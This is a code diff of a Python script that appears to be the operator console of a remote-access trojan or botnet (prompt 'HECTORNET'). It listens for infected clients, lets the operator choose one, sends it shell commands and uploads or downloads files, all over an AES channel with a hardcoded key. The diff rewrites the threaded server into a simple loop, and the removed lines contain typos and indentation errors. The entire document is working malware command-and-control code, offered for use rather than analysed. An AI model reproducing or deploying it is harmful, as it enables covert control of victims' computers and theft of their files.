@@ -1,73 +1,40 @@
 #!/usr/bin/env python
 
 from Crypto.Cipher import AES
-import sys
-import socket, base64, os, time, sys, select, threading
+import socket, base64, os, time, sys, select
 
+# the block size for the cipher object; must be 16, 24, or 32 for AES
 BLOCK_SIZE = 32
 
+# one-liners to encrypt/encode and decrypt/decode a string
+# encrypt with AES, encode with base64
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 
+# generate a random secret key
 secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"
 
-inf_sock = {}
-inf_port = {}
-inf_name = {}
+# clear function
+##################################
+# Windows ---------------> cls
+# Linux   ---------------> clear
+if os.name == 'posix': clf = 'clear'
+if os.name == 'nt': clf = 'cls'
+clear = lambda: os.system(clf)
 
+# initialize socket
+c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.bind(('0.0.0.0', 6000))
+c.listen(128)
+
+# client information
 active = False
 clients = []
 socks = []
 interval = 0.8
 
-listen_port = None
-server_thread = None
-
-HOST = ''
-PORT = 4040
-
-def run_server():
-	client_socket=None
-	server_running = True
-
-	try:
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server.bind((HOST, PORT))
-            server.listen(128)
-            listen_port = PORT
-        except Exception as e:
-            server_thread='Failed'
-            return
-        server_thread = threading.currentThread()
-        while True:
-            if not server_running:
-                break
-            try:
-                server.settimeout(10)
-                client_socket, addr = server.accept()
-            except Exception as e:
-                pass
-            if client_socket:
-		client_socket.settimeout(None)
-		socks += [client_scoket.settimeout]
-		clients += [str(addr)]
-                inf_sock[addr[0]] = client_socket
-                inf_port[addr[0]] = addr[1]
-                client_socket = None
-	    refresh()
-	    time.sleep(interval)
-
-        server.close()
-        for n in inf_sock: inf_sock[n].close()
-        inf_sock={}
-        inf_port={}
-        listen_port=None
-        server_thread=None
-	
-
-def stop_server():
-        server_running = False
+# Functions
+###########
 
 # send data
 def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
@@ -144,83 +111,112 @@ def refresh():
 	print "\nPress Ctrl+C to interact with client."
 
 
-def server_main():
+# main loop
+while True:
+	refresh()
+	# listen for clients
 	try:
-	        run_server()
-	except KeyboardInterrupt:
+		# set timeout
+		c.settimeout(10)
+		
+		# accept connection
+		try:
+			s,a = c.accept()
+		except socket.timeout:
+			continue
+		
+		# add socket
+		if (s):
+			s.settimeout(None)
+			socks += [s]
+			clients += [str(a)]
+		
+		# display clients
 		refresh()
 		
-		activate = raw_input("\nEnter option(0/1-128): ")
+		# sleep
+		time.sleep(interval)
+
+	except KeyboardInterrupt:
 		
+		# display clients
+		refresh()
+		
+		# accept selection --- int, 0/1-128
+		activate = input("\nEnter option: ")
+		
+		# exit
 		if activate == 0:
-			for j in range(0, len(socks)):
+			print '\nExiting...\n'
+			for j in range(0,len(socks)):
 				socks[j].close()
+			sys.exit()
 		
+		# subtract 1 (array starts at 0)
 		activate -= 1
+	
+		# clear screen
+		clear()
+		
+		# create a cipher object using the random secret
 		cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')
+		print '\nActivating client: ' + clients[activate] + '\n'
 		active = True
 		Send(socks[activate], 'Activate')
-	
-		while active:
-			try:
-				# receive data from client
-				data = Receive(socks[activate])
-			# disconnect client.
-			except:
-				print '\nClient disconnected... ' + clients[activate]
-				# delete client
-				socks[activate].close()
-				time.sleep(0.8)
-				socks.remove(socks[activate])
-				clients.remove(clients[activate])
-				refresh()
-				active = False
-				break
+		
+	# interact with client
+	while active:
+		try:
+			# receive data from client
+			data = Receive(socks[activate])
+		# disconnect client.
+		except:
+			print '\nClient disconnected... ' + clients[activate]
+			# delete client
+			socks[activate].close()
+			time.sleep(0.8)
+			socks.remove(socks[activate])
+			clients.remove(clients[activate])
+			refresh()
+			active = False
+			break
 
-			# exit client session
-			if data == 'quitted':
-				# print message
-				print "Exit.\n"
-				# remove from arrays
-				socks[activate].close()
-				socks.remove(socks[activate])
-				clients.remove(clients[activate])
-				# sleep and refresh
-				time.sleep(0.8)
-				refresh()
-				active = False
-				break
-			# if data exists
-			elif data != '':
-				# get next command
-				sys.stdout.write(data)
-				nextcmd = raw_input('~HECTORNET:>>> ')
-			
-			# download
-			if nextcmd.startswith("download ") == True:
-				if len(nextcmd.split(' ')) > 2:
-					download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
-				else:
-					download(socks[activate], nextcmd.split(' ')[1])
-			
-			# upload
-			elif nextcmd.startswith("upload ") == True:
-				if len(nextcmd.split(' ')) > 2:
-					upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
-				else:
-					upload(socks[activate], nextcmd.split(' ')[1])
-			
-			# normal command
-			elif nextcmd != '':
-				Send(socks[activate], nextcmd)
+		# exit client session
+		if data == 'quitted':
+			# print message
+			print "Exit.\n"
+			# remove from arrays
+			socks[activate].close()
+			socks.remove(socks[activate])
+			clients.remove(clients[activate])
+			# sleep and refresh
+			time.sleep(0.8)
+			refresh()
+			active = False
+			break
+		# if data exists
+		elif data != '':
+			# get next command
+			sys.stdout.write(data)
+			nextcmd = raw_input()
+		
+		# download
+		if nextcmd.startswith("download ") == True:
+			if len(nextcmd.split(' ')) > 2:
+				download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
+			else:
+				download(socks[activate], nextcmd.split(' ')[1])
+		
+		# upload
+		elif nextcmd.startswith("upload ") == True:
+			if len(nextcmd.split(' ')) > 2:
+				upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
+			else:
+				upload(socks[activate], nextcmd.split(' ')[1])
+		
+		# normal command
+		elif nextcmd != '':
+			Send(socks[activate], nextcmd)
 
-			elif nextcmd == '':
-				sys.exit()
-
-	        except Exception as e:
-	        	print("Exiting due to an exception:\n{}".format(str(e)))
-	        	print("[!] {}\n".format(str(e)))
-
-
-if __name__ == "__main__":
-    server_main()
+		elif nextcmd == '':
+                        print 'Think before you type. ;)\n'
